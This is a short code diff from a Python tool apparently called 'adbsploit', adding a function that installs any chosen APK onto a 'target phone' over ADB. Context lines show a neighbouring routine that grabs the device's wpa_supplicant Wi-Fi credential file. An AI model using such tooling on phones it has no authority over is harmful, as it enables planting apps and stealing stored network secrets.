@@ -328,4 +328,20 @@ def wpa_supplicant():
         except:
             print(arrow + Fore.RED + 'An error has been occurred grabbing the wpa_supplicant')
     else:
+        print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))
+
+# install any apk in the target phone
+def install():
+    global device
+    if device != 'none':
+        try:
+            print(("[{0}+{1}] Enter the apk path").format(Fore.RED, Fore.WHITE))
+            apk = input(arrow + " adbsploit" + Fore.RED + "(install) " + Fore.WHITE + "> ")
+            d = adbutils.adb.device(device)
+            d.install(apk)
+            print(arrow + Fore.GREEN + 'APK installed successfully')
+        except:
+            print(
+                arrow + Fore.RED + 'An error has been occurred installing the APK. Check the path or the error related')
+    else:
         print(arrow + ("[{0}+{1}] You must select a device before...").format(Fore.RED, Fore.WHITE))      
